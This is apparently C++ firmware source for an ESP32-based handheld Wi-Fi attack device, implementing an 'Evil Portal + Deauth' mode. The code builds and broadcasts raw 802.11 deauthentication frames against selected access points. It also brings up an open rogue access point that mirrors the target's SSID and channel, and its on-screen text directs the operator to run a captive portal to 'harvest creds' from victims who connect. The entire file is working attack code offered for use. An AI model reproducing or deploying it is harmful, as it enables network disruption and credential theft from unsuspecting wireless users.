/*
 * Evil Portal + Deauth combo — see header.
 */

#include "evil_deauth.h"
#include "target_list.h"
#include "wificonfig.h"
#include "utils.h"
#include "Touchscreen.h"

#include <esp_wifi.h>
#include <esp_wifi_types.h>
#include <WiFi.h>
#include <string.h>

#define DARK_GRAY 0x4208

#define BTN_UP 6

namespace EvilDeauth {

static uint8_t deauth_frame[26] = {
  0xc0, 0x00, 0x3a, 0x01,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0xf0, 0xff, 0x02, 0x00
};

static bool      attackActive = false;
static bool      apStarted = false;
static char      apSsid[33] = {0};
static uint8_t   apChannel = 1;
static uint32_t  deauthCount = 0;
static int       stationsSeen = 0;
static uint32_t  lastUiUpdate = 0;
static uint32_t  lastBtnMs = 0;
static const uint32_t BTN_DEBOUNCE_MS = 200;
static bool      toggleHeldFromPrev = true;

static void sendDeauth(const uint8_t bssid[6], uint8_t channel) {
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  delay(1);
  for (int i = 0; i < 6; i++) {
    deauth_frame[10 + i] = bssid[i];
    deauth_frame[16 + i] = bssid[i];
  }
  for (int b = 0; b < 4; b++) {
    esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
    deauthCount++;
  }
}

static void startRogueAp() {
  // Pick SSID/channel from first selected target; fallback to FreeWiFi/ch1
  bool found = false;
  for (int i = 0; i < TargetList::targetCount; i++) {
    if (TargetList::targets[i].selected) {
      strncpy(apSsid, TargetList::targets[i].ssid, 32);
      apSsid[32] = '\0';
      if (apSsid[0] == '\0') strncpy(apSsid, "FreeWiFi", 32);
      apChannel = TargetList::targets[i].channel;
      if (apChannel == 0) apChannel = 1;
      found = true;
      break;
    }
  }
  if (!found) {
    strncpy(apSsid, "FreeWiFi", 32);
    apChannel = 1;
  }

  WiFi.mode(WIFI_AP);
  WiFi.softAP(apSsid, NULL, apChannel);  // open, on target's channel
  apStarted = true;
  Serial.printf("[EvilDeauth] Open AP \"%s\" on ch %d\n", apSsid, apChannel);
}

static void drawTopStatus() {
  tft.fillRect(35, 20, 205, 16, DARK_GRAY);
  tft.setTextFont(1); tft.setTextSize(1);
  tft.setTextColor(attackActive ? TFT_RED : TFT_WHITE);
  tft.setCursor(35, 24);
  tft.printf("EvilPortal+Deauth  %u TX", (unsigned)deauthCount);
  tft.setTextColor(attackActive ? TFT_GREEN : TFT_DARKGREY);
  tft.setCursor(170, 24);
  tft.print(attackActive ? "ACTIVE" : "PAUSED");
}

static void drawInfoBlock() {
  tft.fillRect(0, 45, tft.width(), tft.height() - 60, TFT_BLACK);
  tft.setTextFont(1); tft.setTextSize(1);

  tft.setTextColor(TFT_YELLOW);
  tft.setCursor(2, 50);
  tft.print("Evil Portal + Deauth combo");

  tft.setTextColor(TFT_DARKGREY);
  tft.setCursor(2, 65);
  tft.print("Open AP mirrors target SSID");
  tft.setCursor(2, 78);
  tft.print("Deauth real AP -> clients roam");

  tft.setTextColor(TFT_WHITE);
  tft.setCursor(2, 100);
  tft.print("[UP]    Toggle ON/OFF");
  tft.setCursor(2, 115);
  tft.print("[SEL]   Exit");

  tft.setTextColor(TFT_CYAN);
  tft.setCursor(2, 140);
  tft.printf("Rogue AP: %.16s", apStarted ? apSsid : "(not started)");
  tft.setCursor(2, 155);
  tft.printf("Channel:  %d", (int)apChannel);
  tft.setCursor(2, 170);
  if (apStarted) {
    int n = WiFi.softAPgetStationNum();
    tft.setTextColor(n > 0 ? TFT_GREEN : TFT_DARKGREY);
    tft.printf("Stations: %d", n);
    stationsSeen = n;
  }

  tft.setTextColor(TFT_WHITE);
  tft.setCursor(2, 195);
  tft.printf("Selected targets: %d", TargetList::selectedCount());
  tft.setCursor(2, 210);
  tft.printf("Deauth frames:    %u", (unsigned)deauthCount);

  if (TargetList::selectedCount() == 0) {
    tft.setTextColor(TFT_RED);
    tft.setCursor(2, 235);
    tft.print("No targets selected.");
    tft.setTextColor(TFT_WHITE);
    tft.setCursor(2, 250);
    tft.print("Run AP Scan & Select first.");
  } else {
    tft.setTextColor(TFT_DARKGREY);
    tft.setCursor(2, 235);
    tft.print("Then run Captive Portal to");
    tft.setCursor(2, 248);
    tft.print("harvest creds from connected.");
  }
}

void evilDeauthSetup() {
  tft.fillScreen(TFT_BLACK);
  setupTouchscreen();
  pcf.pinMode(BTN_UP, INPUT_PULLUP);

  attackActive = false;
  apStarted = false;
  apSsid[0] = '\0';
  apChannel = 1;
  deauthCount = 0;
  stationsSeen = 0;
  toggleHeldFromPrev = true;

  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_promiscuous(false);
  esp_wifi_stop();
  esp_wifi_set_mode(WIFI_MODE_AP);
  esp_wifi_start();

  startRogueAp();

  float v = readBatteryVoltage();
  drawStatusBar(v, false);
  tft.fillRect(0, 20, 240, 16, DARK_GRAY);
  drawInfoBlock();
  drawTopStatus();
  lastUiUpdate = millis();
}

void evilDeauthLoop() {
  tft.drawLine(0, 19, 240, 19, TFT_WHITE);
  uint32_t now = millis();

  bool up = !pcf.digitalRead(BTN_UP);
  if (toggleHeldFromPrev) {
    if (!up) toggleHeldFromPrev = false;
  } else if (up && now - lastBtnMs > BTN_DEBOUNCE_MS) {
    attackActive = !attackActive;
    lastBtnMs = now;
    toggleHeldFromPrev = true;
    Serial.printf("[EvilDeauth] %s\n", attackActive ? "STARTED" : "PAUSED");
    drawTopStatus();
  }

  if (attackActive && TargetList::selectedCount() > 0) {
    // Deauth each selected AP on its channel.
    for (int i = 0; i < TargetList::targetCount; i++) {
      if (!TargetList::targets[i].selected) continue;
      sendDeauth(TargetList::targets[i].bssid, TargetList::targets[i].channel);
    }
    // Snap channel back to the rogue AP's channel so clients can hear us.
    esp_wifi_set_channel(apChannel, WIFI_SECOND_CHAN_NONE);
  }

  if (now - lastUiUpdate > 400) {
    drawInfoBlock();
    drawTopStatus();
    lastUiUpdate = now;
  }

  delay(attackActive ? 8 : 30);
}

}  // namespace EvilDeauth
